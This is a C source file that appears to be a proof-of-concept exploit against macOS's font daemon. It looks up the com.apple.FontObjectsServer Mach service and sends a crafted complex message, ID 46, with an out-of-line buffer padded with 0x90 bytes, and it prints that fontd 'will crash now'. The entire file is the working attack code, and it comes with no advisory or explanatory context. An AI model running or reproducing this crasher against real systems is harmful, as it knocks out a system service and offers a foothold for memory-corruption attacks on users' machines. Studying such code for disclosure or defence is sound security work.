#include <stdio.h>
#include <stdlib.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

#define SERVICE_NAME "com.apple.FontObjectsServer"
#define DEFAULT_MSG_ID 46

#define EXIT_ON_MACH_ERROR(msg, retval, success_retval) if (kr != 
success_retval) { mach_error(msg ":" , kr); exit((retval)); }


typedef struct {
mach_msg_header_t header;
mach_msg_size_t descriptor_count;
mach_msg_ool_descriptor64_t desc;
} msg_format_send_t;
typedef struct {
u_int32_t int1;
u_int32_t int2;
u_int32_t size_data;
char data[512];
} hi_msg;

int main(int argc, char **argv) {
kern_return_t kr;
msg_format_send_t send_msg;
mach_msg_header_t *send_hdr;
mach_port_t server_port;
vm_address_t hi_addr = 0;
hi_msg *hello;

kr = bootstrap_look_up(bootstrap_port, SERVICE_NAME, &server_port);
EXIT_ON_MACH_ERROR("bootstrap_look_up", kr, BOOTSTRAP_SUCCESS);

vm_allocate(mach_task_self(), &hi_addr, sizeof(hi_msg), 
VM_FLAGS_ANYWHERE);

hello = (hi_msg *)hi_addr;

send_hdr = &(send_msg.header);

send_hdr->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MOVE_SEND,0) | 
MACH_MSGH_BITS_COMPLEX;

send_hdr->msgh_size = sizeof(send_msg);
send_hdr->msgh_remote_port = server_port;
send_hdr->msgh_local_port = MACH_PORT_NULL;
send_hdr->msgh_id = DEFAULT_MSG_ID;
send_msg.descriptor_count = 1;
send_msg.desc.address = (uint64_t)hello;
send_msg.desc.size = sizeof(hi_msg);
send_msg.desc.type = MACH_MSG_OOL_DESCRIPTOR;
printf("Sending... fontd will crash now.n");
hello->int1 = __builtin_bswap32(0x16);
hello->int2 = __builtin_bswap32(0x01);
hello->size_data = __builtin_bswap32(sizeof(hello->data));
memset(hello->data, 0x90, sizeof(hello->data));

// send request
kr = mach_msg(send_hdr, // message buffer
 MACH_SEND_MSG, // option indicating send
 send_hdr->msgh_size, // size of header + body
 0, // receive limit
 MACH_PORT_NULL, // receive name
 MACH_MSG_TIMEOUT_NONE, // no timeout, wait forever
 MACH_PORT_NULL); // no notification port
EXIT_ON_MACH_ERROR("mach_msg(send)", kr, MACH_MSG_SUCCESS);

printf("Exiting");
exit(0);
}